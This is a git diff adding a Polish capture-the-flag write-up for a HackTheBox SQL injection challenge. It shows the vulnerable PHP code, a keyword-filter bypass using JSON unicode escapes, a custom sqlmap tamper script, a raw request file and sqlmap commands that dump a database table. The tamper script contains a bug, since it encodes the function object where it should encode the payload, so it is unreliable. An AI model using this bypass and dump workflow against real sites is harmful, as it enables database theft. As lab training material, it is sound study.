@@ -213,4 +213,79 @@ print("Password:" + password)
 ### 2.6 Zadanie 6
 **Nazwa:** WAFWAF
 **Punkty:** 40 
-**Flaga:**  
+**Flaga:** HTB{w4f_w4fing_my_w4y_0utt4_h3r3}
+1. Na stronie otrzymujemy kod klasy `db`. 
+```php
+<?php error_reporting(0);
+require 'config.php';
+
+class db extends Connection {
+    public function waf($s) {
+        if (preg_match_all('/'. implode('|', array(
+            '[' . preg_quote("(*<=>|'&-@") . ']',
+            'select', 'and', 'or', 'if', 'by', 'from', 
+            'where', 'as', 'is', 'in', 'not', 'having'
+        )) . '/i', $s, $matches)) die(var_dump($matches[0]));
+        return json_decode($s);
+    }
+
+    public function query($sql) {
+        $args = func_get_args();
+        unset($args[0]);
+        return parent::query(vsprintf($sql, $args));
+    }
+}
+
+$db = new db();
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $obj = $db->waf(file_get_contents('php://input'));
+    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
+} else {
+    die(highlight_file(__FILE__, 1));
+}
+?>
+```
+
+* Metoda `waf` jest to filtr majacy na  celu zabezpieczyćstronę przed atakiem `sql injection`. Widzimy że tenfiltr jest skonstruowany dość prosto i zapewne będzię gomożna w jakiś sposób obejść
+* Widzimy również, że zwracana odpowiedź musimy miećpostać json'a: `{"user":"<INJECTED SQL>"}`
+* Widzimy również dziwną dyrektywę `php://input`, poprzeczytaniu https://www.php.net/manual/en/wrappers.phpphp, okazuję się jednak że jest to poprostu odczyt danychwysłanych za pomocą zapytania typu `POST`
+* Wykonywane query `"SELECT note FROM notes WHEREassignee = '%s'"` nasz payloady jest wstrzykiwane w `%s`
+2. Snippet funkcji `waf` wklejam do interpretra online co pozwala, na swobodne próbowanie obejścia filtra
+   1. Znalazłem informację na temat tego że taki filtry można obchodzić kodowanie naprzykład w przypadku jsona wspieranym formatem jst utf-8, a więc możemy zakodowac payload do tego formatu a następnie go przekazać.
+   2. Wynikiem tych działań jest taki skrypt który przechodzi przez fillt, ale nie otrzymuj żadnej zwrotki dlatego musimy użyć cięższego narzędzia jak `sqlmap` który autmatyzuję proces wykrywania i wykorzystania `sql injection`
+3. SqlMap, do  sqlmap możemy pisać własne skrypty które przetwarzają dane przed wstrzyknięciem ich przez narzędzie tzw. `tamper scripts` https://lucadidomenico.medium.com/how-to-write-custom-tamper-scripts-for-sqlmap-93927808809e- przykładowy plik i jak go wykrozystać
+4. Moj tamper script:
+```python
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL
+def dependencies():
+    pass
+def tamper(payload, **kwargs):
+    def toUtf8(payload: str): return ''.join(map(lambda s: str(hex(ord(s))), payload)).replace('0x','\\u00')
+    
+    return toUtf8(tamper)
+```
+5. Musimy równiez przygotwać zapytanie zgodne z RFC protokołu http, możemy je uzyskać z developer tools: `networking -> request -> view source`
+```
+POST / HTTP/1.1
+Host: 206.189.121.131:30810
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-GPC: 1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{"user":"*"}
+```
+6. Teraz mozemy urchomić skypt sqlmap: 
+1.`sqlmap --tamper=tamper.py -r request.txt  --dbs`Parametr `--dbs` zwróci nam listę dostępnych baz
+2. Wywołamy skrypt ponownie dla intersujące nas bazy:    `sqlmap --tamper=tamper.py -r request.txt --D db_m8452      --tables` 
+3. dump tabeli: `sqlmap --tamper=tamper.py -r request.txt    -D db_m8452  -T definitely_not_a_flag -dump`
+* Wykryta podatnośc prze sqlmap to tzw. `time-base blind`, czyli w momencie gdy nie otrzymujemy od serwera żadnej odpowiedzi, w postaci tekstu lub jsona możemy wstrzymywać pracę serwera na kilka sekunda jeśli podane query jest fałszywe a gdy jest prawdziwe odrazu kończyć. Atak ten przypomina atak typu booleanization ponieważ tutaj też jesteśmy zmuszeni zgadywać "literka po literce", dostajemy jedynie odpowiedz typu prawda fałsz.
+9. Rezultat:
+![image](/zad6/zad6.png)
